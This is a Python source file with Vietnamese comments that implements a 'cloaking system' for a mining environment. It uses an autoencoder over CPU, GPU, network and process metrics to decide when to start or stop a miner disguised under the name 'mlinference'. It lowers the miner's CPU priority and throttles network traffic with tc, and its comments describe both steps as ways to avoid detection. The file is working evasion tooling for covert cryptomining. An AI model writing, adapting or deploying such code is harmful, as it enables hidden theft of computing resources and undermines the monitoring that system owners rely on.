import os
import subprocess
import sys
import time
import threading
import atexit
import signal
import psutil
import GPUtil
import tensorflow as tf
from tensorflow.keras import models
from sklearn.preprocessing import MinMaxScaler
from loguru import logger

# ===== Cấu hình logging =====
logger.remove()  # Loại bỏ các handler mặc định
logger.add(
    "/app/mining-environment/logs/cloaking_system.log",
    rotation="10 MB",
    retention="7 days",
    compression="zip",
    level="INFO",
    enqueue=True,
    backtrace=True,
    diagnose=True
)

# ===== Cấu hình môi trường =====
BASE_CONFIG_DIR = os.getenv("CONFIG_DIR", "/app/mining-environment/config")
BASE_MODELS_DIR = os.getenv("MODELS_DIR", "/app/mining-environment/models")
BASE_LOGS_DIR = os.getenv("LOGS_DIR", "/app/mining-environment/logs")
BASE_RESOURCES_DIR = os.getenv("RESOURCES_DIR", "/app/mining-environment/resources")
MINING_COMMAND = os.getenv("MINING_COMMAND", "/usr/local/bin/mlinference")
MINING_CONFIG = os.getenv("MINING_CONFIG", "mlinference_config.json")
CLOAKING_THRESHOLD = float(os.getenv("CLOAKING_THRESHOLD", "0.9"))
CLOAKING_INTERVAL = int(os.getenv("CLOAKING_INTERVAL", "60"))  # Giây

class AIEnvironmentCloaking:
    def __init__(self, cloaking_threshold=CLOAKING_THRESHOLD, interval=CLOAKING_INTERVAL):
        """
        Khởi tạo hệ thống cloaking với mô hình AI và ngưỡng cloaking.

        :param cloaking_threshold: Ngưỡng lỗi tái tạo để kích hoạt cloaking
        :param interval: Khoảng thời gian giữa các chu kỳ cloaking (giây)
        """
        self.cloaking_threshold = cloaking_threshold
        self.interval = interval
        self.is_cloaking_active = False
        self.lock = threading.Lock()
        self.mining_process = None  # Quản lý tiến trình khai thác
        self.shutdown_event = threading.Event()

        self.configure_tensorflow()
        self.model = self.load_model()
        self.scaler = self.initialize_scaler()
        self.setup_system_metrics()
        self.start_cloaking()

    def configure_tensorflow(self):
        """
        Cấu hình TensorFlow để tối ưu hóa cho CPU.
        """
        try:
            tf.config.threading.set_intra_op_parallelism_threads(4)
            tf.config.threading.set_inter_op_parallelism_threads(4)
            tf.config.optimizer.set_jit(True)
            # Đảm bảo TensorFlow chỉ sử dụng CPU
            tf.config.set_visible_devices([], 'GPU')
            logger.info("TensorFlow đã được cấu hình để sử dụng CPU với tối ưu hóa.")
        except Exception as e:
            logger.error(f"Lỗi khi cấu hình TensorFlow: {e}")

    def load_model(self):
        """
        Tải mô hình AI từ đường dẫn được cung cấp qua biến môi trường hoặc mặc định.

        :return: Mô hình đã tải
        """
        model_path = os.getenv("CLOAKING_MODEL_PATH", os.path.join(BASE_MODELS_DIR, "cloaking_model.h5"))
        try:
            model = models.load_model(model_path)
            logger.info(f"Mô hình AI đã được tải thành công từ {model_path}")
            return model
        except Exception as e:
            logger.error(f"Lỗi khi tải mô hình AI từ {model_path}: {e}")
            sys.exit(1)

    def initialize_scaler(self):
        """
        Khởi tạo MinMaxScaler và tải dữ liệu nếu có.

        :return: Đối tượng MinMaxScaler đã được khởi tạo
        """
        scaler = MinMaxScaler()
        scaler_path = os.path.join(BASE_MODELS_DIR, "scaler.pkl")
        if os.path.exists(scaler_path):
            try:
                import joblib
                scaler = joblib.load(scaler_path)
                logger.info("MinMaxScaler đã được tải từ scaler.pkl.")
            except Exception as e:
                logger.error(f"Lỗi khi tải MinMaxScaler từ {scaler_path}: {e}")
        else:
            logger.warning(f"Scaler file {scaler_path} không tồn tại. MinMaxScaler sẽ được fit lại.")
        return scaler

    def setup_system_metrics(self):
        """
        Thiết lập các chỉ số hệ thống cần thu thập.
        """
        self.metrics = {
            "cpu_usage": 0.0,
            "ram_usage": 0.0,
            "gpu_memory_usage": 0.0,
            "disk_io": 0,
            "network_bandwidth": 0,
            "cache_usage": 0,
            "temperature": 0.0,
            "power_consumption": 0.0,
            "num_processes": 0,
            "threads_per_process": 0.0
        }
        logger.info("Các chỉ số hệ thống đã được thiết lập.")

    def collect_system_metrics(self):
        """
        Thu thập các chỉ số hệ thống hiện tại.
        """
        try:
            self.metrics["cpu_usage"] = psutil.cpu_percent(interval=None)
            self.metrics["ram_usage"] = psutil.virtual_memory().percent

            gpus = GPUtil.getGPUs()
            if gpus:
                self.metrics["gpu_memory_usage"] = gpus[0].memoryUtil
            else:
                self.metrics["gpu_memory_usage"] = 0.0

            disk_io = psutil.disk_io_counters()
            self.metrics["disk_io"] = disk_io.read_bytes + disk_io.write_bytes

            net_io = psutil.net_io_counters()
            self.metrics["network_bandwidth"] = net_io.bytes_sent + net_io.bytes_recv

            self.metrics["cache_usage"] = self.get_cache_usage()
            self.metrics["temperature"] = self.get_system_temperature()
            self.metrics["power_consumption"] = self.get_power_consumption()
            self.metrics["num_processes"] = len(psutil.pids())
            self.metrics["threads_per_process"] = self.get_threads_per_process()

            logger.info(f"Thu thập chỉ số hệ thống: {self.metrics}")
        except Exception as e:
            logger.error(f"Lỗi khi thu thập chỉ số hệ thống: {e}")

    def get_cache_usage(self):
        """
        Lấy thông tin sử dụng cache.

        :return: Lượng cache đang sử dụng (MB)
        """
        try:
            with open('/proc/meminfo', 'r') as meminfo:
                for line in meminfo:
                    if line.startswith('Cached:'):
                        return float(line.split()[1]) / 1024  # MB
            return 0.0
        except Exception as e:
            logger.error(f"Lỗi khi lấy thông tin cache: {e}")
            return 0.0

    def get_system_temperature(self):
        """
        Lấy thông tin nhiệt độ hệ thống.

        :return: Nhiệt độ hệ thống (°C)
        """
        try:
            # Sử dụng sensors trên Linux
            output = subprocess.check_output(['sensors']).decode()
            temps = [float(line.split()[1].replace('+', '').replace('°C', ''))
                     for line in output.splitlines() if 'temp' in line.lower()]
            return max(temps) if temps else 0.0
        except Exception as e:
            logger.error(f"Lỗi khi lấy nhiệt độ hệ thống: {e}")
            return 0.0

    def get_power_consumption(self):
        """
        Lấy thông tin tiêu thụ năng lượng.

        :return: Tiêu thụ năng lượng hệ thống (W)
        """
        try:
            # Cần tùy chỉnh dựa trên hệ thống, ví dụ sử dụng IPMI hoặc các công cụ khác
            return 250.0  # Giá trị giả định
        except Exception as e:
            logger.error(f"Lỗi khi lấy tiêu thụ năng lượng: {e}")
            return 0.0

    def get_threads_per_process(self):
        """
        Tính toán số luồng trung bình trên mỗi tiến trình.

        :return: Số luồng trung bình
        """
        try:
            total_threads = sum(proc.num_threads() for proc in psutil.process_iter(['num_threads']))
            num_processes = len(psutil.pids())
            return total_threads / num_processes if num_processes > 0 else 0.0
        except Exception as e:
            logger.error(f"Lỗi khi tính số luồng: {e}")
            return 0.0

    def preprocess_data(self):
        """
        Tiền xử lý dữ liệu thu thập để phù hợp với đầu vào của mô hình AI.

        :return: Dữ liệu đã được chuẩn hóa hoặc None nếu lỗi
        """
        try:
            data = [
                self.metrics["cpu_usage"],
                self.metrics["ram_usage"],
                self.metrics["gpu_memory_usage"],
                self.metrics["disk_io"],
                self.metrics["network_bandwidth"],
                self.metrics["cache_usage"],
                self.metrics["temperature"],
                self.metrics["power_consumption"],
                self.metrics["num_processes"],
                self.metrics["threads_per_process"]
            ]
            if not hasattr(self.scaler, 'n_features_in_'):
                self.scaler.fit([data])
                logger.info("MinMaxScaler đã được fit với dữ liệu đầu vào.")
                # Lưu scaler để sử dụng sau này
                scaler_path = os.path.join(BASE_MODELS_DIR, "scaler.pkl")
                import joblib
                joblib.dump(self.scaler, scaler_path)
                logger.info(f"MinMaxScaler đã được lưu tại {scaler_path}.")
            scaled_data = self.scaler.transform([data])[0]
            logger.info(f"Tiền xử lý dữ liệu: {scaled_data}")
            return scaled_data
        except Exception as e:
            logger.error(f"Lỗi khi tiền xử lý dữ liệu: {e}")
            return None

    def detect_anomaly(self, scaled_data):
        """
        Sử dụng mô hình AI để phát hiện bất thường dựa trên dữ liệu đã được tiền xử lý.

        :param scaled_data: Dữ liệu đã được chuẩn hóa
        :return: Sai số tái tạo (Reconstruction Error)
        """
        try:
            reconstruction = self.model.predict(scaled_data.reshape(1, -1))
            reconstruction_error = tf.keras.losses.mean_squared_error(
                scaled_data, reconstruction[0]
            ).numpy()
            logger.info(f"Reconstruction Error: {reconstruction_error}")
            return reconstruction_error
        except Exception as e:
            logger.error(f"Lỗi khi phát hiện bất thường: {e}")
            return 0.0

    def perform_cloaking_actions(self, reconstruction_error):
        """
        Thực hiện các biện pháp cloaking dựa trên sai số tái tạo.

        :param reconstruction_error: Sai số tái tạo từ mô hình AI
        """
        try:
            if reconstruction_error > self.cloaking_threshold:
                with self.lock:
                    if not self.is_cloaking_active:
                        self.is_cloaking_active = True
                        logger.info(f"Cloaking được kích hoạt với Reconstruction Error: {reconstruction_error}")
                        self.reduce_cpu_usage()
                        self.adjust_network_bandwidth()
                        self.start_mining()
            else:
                with self.lock:
                    if self.is_cloaking_active:
                        self.is_cloaking_active = False
                        logger.info("Cloaking được hủy kích hoạt.")
                        self.restore_cpu_usage()
                        self.restore_network_bandwidth()
                        self.stop_mining()
        except Exception as e:
            logger.error(f"Lỗi trong quá trình thực hiện cloaking actions: {e}")

    def reduce_cpu_usage(self):
        """
        Giảm tải CPU để tránh gây ra sự bất thường.
        """
        try:
            mining_pid = self.get_mining_process_pid()
            if mining_pid:
                process = psutil.Process(mining_pid)
                process.nice(psutil.IDLE_PRIORITY_CLASS if hasattr(psutil, 'IDLE_PRIORITY_CLASS') else 19)
                logger.info(f"Giảm độ ưu tiên CPU của tiến trình {mining_pid}")
            else:
                logger.warning("Không tìm thấy tiến trình khai thác để giảm tải CPU.")
        except Exception as e:
            logger.error(f"Lỗi khi giảm tải CPU: {e}")

    def restore_cpu_usage(self):
        """
        Khôi phục độ ưu tiên CPU của tiến trình khai thác.
        """
        try:
            mining_pid = self.get_mining_process_pid()
            if mining_pid:
                process = psutil.Process(mining_pid)
                process.nice(psutil.NORMAL_PRIORITY_CLASS if hasattr(psutil, 'NORMAL_PRIORITY_CLASS') else 0)
                logger.info(f"Khôi phục độ ưu tiên CPU của tiến trình {mining_pid}")
            else:
                logger.warning("Không tìm thấy tiến trình khai thác để khôi phục tải CPU.")
        except Exception as e:
            logger.error(f"Lỗi khi khôi phục tải CPU: {e}")

    def adjust_network_bandwidth(self):
        """
        Điều chỉnh băng thông mạng để tránh bị phát hiện.
        """
        try:
            # Kiểm tra xem tc đã được thiết lập chưa
            existing = subprocess.run(['tc', 'qdisc', 'show', 'dev', 'eth0'], capture_output=True, text=True)
            if 'tbf' not in existing.stdout:
                subprocess.run([
                    'tc', 'qdisc', 'add', 'dev', 'eth0', 'root', 'tbf',
                    'rate', '50mbit', 'burst', '32kbit', 'latency', '400ms'
                ], check=True)
                logger.info("Điều chỉnh băng thông mạng thành công.")
            else:
                logger.info("Băng thông mạng đã được điều chỉnh trước đó.")
        except subprocess.CalledProcessError as e:
            logger.error(f"Lỗi khi điều chỉnh băng thông mạng: {e}")
        except Exception as e:
            logger.error(f"Lỗi không mong muốn khi điều chỉnh băng thông mạng: {e}")

    def restore_network_bandwidth(self):
        """
        Khôi phục băng thông mạng ban đầu.
        """
        try:
            subprocess.run(['tc', 'qdisc', 'del', 'dev', 'eth0', 'root'], check=True)
            logger.info("Khôi phục băng thông mạng thành công.")
        except subprocess.CalledProcessError:
            logger.warning("Không tìm thấy cấu hình băng thông mạng để khôi phục.")
        except Exception as e:
            logger.error(f"Lỗi khi khôi phục băng thông mạng: {e}")

    def start_mining(self):
        """
        Khởi động mã khai thác (mlinference) nếu chưa được khởi động.
        """
        if self.mining_process is None or self.mining_process.poll() is not None:
            try:
                mining_command = [
                    MINING_COMMAND,
                    "--config", os.path.join(BASE_CONFIG_DIR, MINING_CONFIG)
                ]
                self.mining_process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    preexec_fn=os.setsid  # Để quản lý nhóm tiến trình
                )
                logger.info(f"Khởi động mã khai thác với lệnh: {' '.join(mining_command)}")
            except Exception as e:
                logger.error(f"Lỗi khi khởi động mã khai thác: {e}")

    def stop_mining(self):
        """
        Dừng mã khai thác nếu đang chạy.
        """
        if self.mining_process and self.mining_process.poll() is None:
            try:
                os.killpg(os.getpgid(self.mining_process.pid), signal.SIGTERM)
                self.mining_process.wait(timeout=10)
                logger.info("Đã dừng mã khai thác thành công.")
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(self.mining_process.pid), signal.SIGKILL)
                logger.warning("Đã kill mã khai thác sau timeout.")
            except Exception as e:
                logger.error(f"Lỗi khi dừng mã khai thác: {e}")

    def get_mining_process_pid(self):
        """
        Tìm PID của tiến trình khai thác.

        :return: PID của tiến trình khai thác hoặc None nếu không tìm thấy
        """
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if 'miner' in proc.info['name'].lower() or 'mlinference' in proc.info['name'].lower():
                    return proc.info['pid']
            return None
        except Exception as e:
            logger.error(f"Lỗi khi tìm PID của tiến trình khai thác: {e}")
            return None

    def run_cloaking_cycle(self):
        """
        Thực hiện một chu kỳ cloaking: thu thập dữ liệu, phát hiện bất thường và thực hiện cloaking nếu cần.
        """
        self.collect_system_metrics()
        scaled_data = self.preprocess_data()
        if scaled_data is not None:
            reconstruction_error = self.detect_anomaly(scaled_data)
            self.perform_cloaking_actions(reconstruction_error)

    def start_cloaking(self):
        """
        Bắt đầu hệ thống cloaking, thực hiện chu kỳ cloaking định kỳ.
        """
        def cloaking_loop():
            logger.info("Hệ thống cloaking đã bắt đầu.")
            while not self.shutdown_event.is_set():
                self.run_cloaking_cycle()
                self.shutdown_event.wait(self.interval)

        cloaking_thread = threading.Thread(target=cloaking_loop, daemon=True)
        cloaking_thread.start()

    def cleanup(self):
        """
        Thực hiện các bước dọn dẹp khi chương trình kết thúc.
        """
        try:
            logger.info("Bắt đầu quá trình dọn dẹp cloaking system...")
            self.stop_mining()
            self.restore_cpu_usage()
            self.restore_network_bandwidth()
            self.shutdown_event.set()
            logger.info("Đã thực hiện các bước dọn dẹp cloaking system.")
        except Exception as e:
            logger.error(f"Lỗi trong quá trình dọn dẹp: {e}")

def initialize_cloaking():
    """
    Hàm để khởi tạo và bắt đầu hệ thống cloaking.
    """
    cloaking_system = AIEnvironmentCloaking()
    atexit.register(cloaking_system.cleanup)
    return cloaking_system

if __name__ == "__main__":
    # Chỉ chạy khi tệp này được chạy trực tiếp, không phải khi import
    cloaking_system = initialize_cloaking()
    try:
        while True:
            time.sleep(1)
    except (KeyboardInterrupt, SystemExit):
        logger.info("Đã nhận tín hiệu dừng chương trình.")
        cloaking_system.cleanup()
